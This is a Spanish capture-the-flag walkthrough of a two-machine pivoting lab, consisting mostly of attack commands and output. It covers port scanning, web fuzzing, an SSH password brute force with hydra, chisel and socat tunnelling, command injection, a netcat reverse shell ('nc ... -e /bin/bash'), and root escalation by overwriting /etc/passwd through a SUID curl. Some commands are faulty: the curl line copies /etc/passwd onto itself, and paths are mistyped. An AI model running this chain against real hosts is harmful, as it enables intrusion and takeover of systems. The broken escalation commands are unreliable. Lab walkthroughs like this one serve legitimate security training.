@@ -1,0 +1,156 @@
+# Escaneo de Puertos, Servicios y versiones
+nmap -Pn -n -sS -p- -sV --script vuln --min-rate 5000 -vvv -oN nmap 10.10.10.2
+
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
+
+revisando el servicio web (puerto 80), no conseguimos nada interesante,
+inspeccionando el codigo fuente tampoco asi que aplicaremos fuzzing web
+
+# fuzzing
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.10.2/FUZZ' --hc 404
+
+000000085:   200        1 L      22 W       128 Ch      "info"                                                                                                 
+000045240:   200        14 L     25 W       318 Ch      "http://10.10.10.2/"                                                                                   
+000095524:   403        9 L      28 W       275 Ch      "server-status"
+
+revisando "info" nos conseguimos el siguiente mensaje:
+=====================================================================================================================================
+Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
+=====================================================================================================================================
+
+vemos lo que puede ser un posible usuario "toni", asi que lo probaremos contra el servicio ssh
+
+# Ataque al servicio ssh
+
+hydra -l toni -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://10.10.10.2
+
+[22][ssh] host: 10.10.10.2   login: toni   password: banana
+
+ssh toni@10.10.10.2
+password: banana
+
+sudo -l				| nos solicita clave (no podemos)
+find / -perm -4000 2>/dev/null	| no hay binarios de los que podamos abusar
+
+despues de buscar y buscar no veo forma de que podamos escalar privilegios.....
+veamos ahora las interfaces de red disponibles, ya que en el mensaje vemos
+que hay una web expuesta en otra red...
+
+hostname -I
+10.10.10.2 20.20.20.2		| por lo visto tiene 2 interfaces de red y la web esta expuesta en la segunda red
+curl http://20.20.20.3
+
+=======================================================================
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <h1>webilegal.com</h1>
+    <form action="http://20.20.20.3/process.php" method="post">
+        <label for="cmd">Busca un producto ilegal</label><br>
+        <input type="text" id="cmd" name="cmd"><br>
+        <input type="submit" value="Enviar">
+    </form>
+</body>
+</html>
+======================================================================
+
+ok, vemos que si le llegamos, asi que vamos a crear un tunel con chisel 
+para ver este servicio desde nuestra maquina atacante...
+
+1) compartimos desde nuestra maquina atacante a la maquina comprometida 
+chisel
+
+scp chisel toni@10.10.10.2:/home/toni					| enviamos chisel
+======================================================================
+
+ahora vamos a ejecutar chisel en nuestra maquina y en la comprometida:
+
+en la maquina atacante:
+
+./chisel server --reverse -p 90						| chisel como servidor
+
+en la maquina comprometida
+
+./chisel client 10.10.10.1:90 R:socks					| como cliente
+
+=======================================================================
+
+se a creado un tunel proxy
+
+127.0.0.1:1080=>socks:
+
+ahora con este tunel proxy podremos ver el servicio web levantado en 20.20.20.3
+que es un tercer equipo en una red fuera de nuestro alcance....
+configuramos el proxy en nuestro navegador y accedemos a 20.20.20.3
+
+al chequear el servicio, se observa que es un "buscador de productos ilegales"
+pero tras revisar el codigo fuente, vemos que tiene "cmd" lo cual resulta ser 
+muy raro, asi que tras intentar ejecucion de comandos, vemos que en efecto
+podemos ejecutar comandos, pudimos leer el archivo /etc/passwd y vemos que solo
+existe un usuario: root...... 
+
+bueno, ahora vamos a enviarnos una reverse shell, pero debemos hacer uso de socat
+porque actualmente la maquina atacante puede ver la 2da maquina, pero ella no nos
+ve a nosotros.
+
+
+scp socat toni@10.10.10.2:/home/toni			| enviamos socat a la maquina 1 comprometida
+ssh toni@10.10.10.2					| nos conectamos otra vez por ssh para ejecutar socat
+
+desde la maquina1 ejecutamos socat:
+
+./socat tcp-l:9000,fork,reuseaddr tcp:10.10.10.1:10000
+
+todo lo que reciba la maquina1 por el puerto 9000 lo va a redireccionar a la 
+maquina atacante por el puerto 10000 [10.10.10.1:10000]
+
+ya despues de ejecutar socat, nos ponemos en escucha desde la maquina atacante por el puerto 10000 
+
+nc -lvnp 10000			| desde la maquina atacante
+
+
+nos enviamos la reverse shell desde la web levantada en 20.20.20.3
+pero teniendo en cuenta que la reverse shell debe ser enviada a la maquina comprometida que ejecuta
+socat, enviando la reverse shell por el puerto 9000 para que esta lo redireccione al equipo atacante
+por el puerto 10000
+
+nc 20.20.20.2 9000 -e /bin/bash					| enviamos la reverse shell a la maquina1
+
+ahora nos vamos al equipo atacante que estaba escuchando con netcat por el puerto 10000 y ya hemos recibido 
+la conexion, ahora le hacemos un tratamiento de la tty
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+
+sudo -l								| solicita passwd
+find / -perm -4000 2>/dev/null				
+/usr/bin/curl
+
+tenemos el binario curl del cual podremos abusar
+
+cd /tmp								| nos vamos al directorio temporal
+cat etc/passwd							| leemos el archivo /etc/passwd y copiamos su contenido
+nano passwd							
+
+creamos un archivo passwd en el directorio tmp con el mismo contenido de /etc/passwd
+pero eliminando la primera x en la linea de root (esto para que no solicite pass al escalar)
+
+ahora usaremos curl para sobrescribir el archivo /eetc/passwd con el que hemos modificado en /tmp
+
+/usr/bin/curl file:///etc/passwd -o /etc/passwd
+
+como curl se ejecuta con permisos de root, simulamos una descarga desde el archivo /tmp/passwd a /etc/passwd
+consiguiend con esto poder sobreescribir el archivo original por el modificado, solo nos queda escalar
+
+su root
+whoami
+#root
